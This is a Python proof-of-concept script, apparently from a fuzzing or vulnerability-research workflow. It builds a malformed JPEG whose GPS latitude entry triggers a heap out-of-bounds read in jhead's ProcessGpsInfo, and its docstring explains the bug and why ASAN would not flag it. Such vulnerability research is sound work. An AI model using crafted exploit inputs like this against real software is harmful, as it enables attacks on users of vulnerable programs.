#!/usr/bin/env python3
"""
VULN-001 PoC generator: Heap OOB read in ProcessGpsInfo (gpsinfo.c lines 141-154).

Trigger path:
  jhead main() -> ReadJpegFile() -> process_EXIF() -> ProcessExifDir()
               -> ProcessGpsInfo() -> loop for(a=0;a<3;a++)

Bug: The loop always runs 3 iterations (reading 3 * ComponentSize bytes from
ValuePtr), but the bounds check only validates ByteCount = Components *
ComponentSize bytes.  With Components=1 and FMT_URATIONAL (8 bytes each),
the check validates 8 bytes but the loop reads 24 bytes (iterations a=1 and
a=2 are OOB).

NOTE on ASAN detectability:
  jpgfile.c:130 allocates malloc(itemlen+20), adding 20 bytes of extra padding
  past the nominal ExifLength boundary.  The maximum OOB extent here is 15
  bytes past ExifLength (ValuePtr+23 with ValuePtr <= ExifSection+ExifLength-8),
  which stays inside that 20-byte padding.  ASAN therefore will NOT produce a
  heap-buffer-overflow error.  The OOB read still occurs (reading uninitialised
  heap bytes), but a sanitiser-based VERIFIED_CRASH requires a different
  allocator configuration or a larger OOB.

TIFF data layout (76 bytes, all little-endian):
  [0-7]   TIFF header: II, 0x002A, IFD0 offset = 8
  [8-25]  IFD0: count=1, entry (tag=0x8825 GPS pointer, fmt=4 LONG,
                components=1, value=26), next IFD = 0
  [26-67] GPS IFD: count=3
            entry 0: tag=0x0000 (version), fmt=1 BYTE, count=4, inline=02020000
            entry 1: tag=0x0001 (LatRef),  fmt=2 ASCII,count=2, inline='N\0\0\0'
            entry 2: tag=0x0002 (Lat),     fmt=5 URATIONAL, count=1, value=68
          next GPS IFD = 0
  [68-75] 8 bytes of rational data (numerator=30, denominator=1).
          Loop reads up to offset+23 (a=2 iteration), bytes 76-91 are OOB
          but fall inside the extra 20-byte malloc padding in jpgfile.c:130.
"""

import struct
import os

OUTPUT_PATH = "/data/ylwang/non-textfuzz/target/_poc/jhead/exif_c/vuln_001_input.jpg"

# ---------------------------------------------------------------------------
# Build TIFF data
# ---------------------------------------------------------------------------

# TIFF header: II (little-endian marker), magic=0x002A, IFD0 offset=8
tiff_header = struct.pack('<HHI', 0x4949, 0x002A, 8)
assert len(tiff_header) == 8

# IFD0: one entry – the GPS IFD sub-directory pointer
# Entry: tag=0x8825, format=4 (FMT_ULONG), components=1, value=26 (GPS IFD offset)
GPS_IFD_OFFSET = 26  # GPS IFD starts 26 bytes from TIFF start
ifd0 = struct.pack('<H', 1)                            # entry count = 1
ifd0 += struct.pack('<HHII', 0x8825, 4, 1, GPS_IFD_OFFSET)  # GPS IFD pointer
ifd0 += struct.pack('<I', 0)                           # next IFD = 0 (no IFD1)
assert len(ifd0) == 2 + 12 + 4 == 18
assert 8 + 18 == GPS_IFD_OFFSET  # GPS IFD at byte 26 ✓

# GPS IFD: three entries (must be in ascending tag order per TIFF spec)
#   0x0000  GPS Version  – fmt=1 BYTE, count=4, inline value \x02\x02\x00\x00
#   0x0001  GPS LatRef   – fmt=2 ASCII, count=2, inline value 'N\x00\x00\x00'
#   0x0002  GPS Lat      – fmt=5 URATIONAL, count=1, offset to rational data
RATIONAL_OFFSET = GPS_IFD_OFFSET + 2 + 3 * 12 + 4  # = 26 + 42 = 68

gps_ifd = struct.pack('<H', 3)  # entry count = 3

# GPS Version (tag=0x0000, fmt=1 BYTE, components=4, inline value)
gps_ifd += struct.pack('<HHI4s', 0x0000, 1, 4, b'\x02\x02\x00\x00')

# GPS LatRef (tag=0x0001, fmt=2 ASCII, components=2, inline 'N\0')
gps_ifd += struct.pack('<HHI4s', 0x0001, 2, 2, b'N\x00\x00\x00')

# GPS Lat (tag=0x0002, fmt=5 URATIONAL, components=1 ← TRIGGER, offset=68)
# ByteCount = 1 * 8 = 8, so bounds check validates only bytes [68..75].
# Loop runs a=0,1,2 reading ValuePtr+0, +8, +16 (each 8 bytes for URATIONAL),
# so a=1 reads [76..83] and a=2 reads [84..91] – both are OOB w.r.t. ExifLength.
gps_ifd += struct.pack('<HHII', 0x0002, 5, 1, RATIONAL_OFFSET)

gps_ifd += struct.pack('<I', 0)  # next GPS IFD = 0

assert len(gps_ifd) == 2 + 3 * 12 + 4 == 42
assert GPS_IFD_OFFSET + 42 == RATIONAL_OFFSET  # rational data at byte 68 ✓

# Rational data: only ONE rational (8 bytes) for the single component.
# The loop's a=1 and a=2 iterations read 8 bytes each beyond this region.
rational_data = struct.pack('<II', 30, 1)  # 30/1 degrees
assert len(rational_data) == 8

# Assemble the full TIFF block
tiff_data = tiff_header + ifd0 + gps_ifd + rational_data
assert len(tiff_data) == 76, f"Expected 76, got {len(tiff_data)}"

# ExifLength = 76.  Bounds check: RATIONAL_OFFSET + 8 = 68 + 8 = 76 == ExifLength → PASSES.
# Loop OOB: a=1 reads [76..83], a=2 reads [84..91].
# jhead malloc is malloc(itemlen+20) where itemlen = ExifLength+8 = 84.
# Allocation = 104 bytes.  Max OOB byte = ExifSection[91] = Data[99] < Data[103]. No ASAN.

# ---------------------------------------------------------------------------
# Build JPEG
# ---------------------------------------------------------------------------

# APP1 segment: FF E1 + BE-length + "Exif\0\0" + TIFF data
exif_magic = b'Exif\x00\x00'
app1_payload = exif_magic + tiff_data          # 6 + 76 = 82 bytes
app1_length  = len(app1_payload) + 2           # 84 (includes the 2 length bytes)

app1 = b'\xff\xe1' + struct.pack('>H', app1_length) + app1_payload

# Minimal SOF0: 1×1 grey (so jhead can read image dimensions without error)
# Format: marker(2) + length(2) + precision(1) + height(2) + width(2) +
#         num_components(1) + [id(1)+sampling(1)+quant_tbl(1)]
sof0_len = 2 + 1 + 2 + 2 + 1 + 3  # = 11
sof0 = (b'\xff\xc0'
        + struct.pack('>H', sof0_len)
        + b'\x08'                    # 8-bit precision
        + struct.pack('>HH', 1, 1)   # height=1, width=1
        + b'\x01'                    # 1 component
        + b'\x01\x11\x00')           # comp id=1, sampling 1×1, quant table 0

jpeg = b'\xff\xd8' + app1 + sof0 + b'\xff\xd9'

# ---------------------------------------------------------------------------
# Write output
# ---------------------------------------------------------------------------
os.makedirs(os.path.dirname(OUTPUT_PATH), exist_ok=True)
with open(OUTPUT_PATH, 'wb') as f:
    f.write(jpeg)

print(f"[+] Written {len(jpeg)} bytes to {OUTPUT_PATH}")
print(f"    TIFF data length  : {len(tiff_data)} bytes  (= ExifLength)")
print(f"    APP1 length field : {app1_length}")
print(f"    GPS rational at   : offset {RATIONAL_OFFSET} from TIFF start")
print(f"    Valid region      : [{RATIONAL_OFFSET}, {RATIONAL_OFFSET+7}]")
print(f"    OOB a=1           : [{RATIONAL_OFFSET+8}, {RATIONAL_OFFSET+15}]")
print(f"    OOB a=2           : [{RATIONAL_OFFSET+16}, {RATIONAL_OFFSET+23}]")
print(f"    malloc allocation : {app1_length + 20} bytes (itemlen={app1_length} + 20 padding)")
print(f"    Max OOB index     : {RATIONAL_OFFSET+23} (< {app1_length + 20}) -> within padding")
print(f"[!] ASAN unlikely to fire: max OOB = {RATIONAL_OFFSET+23-len(tiff_data)} bytes past")
print(f"    ExifLength, but jhead adds 20 bytes of malloc padding (jpgfile.c:130).")
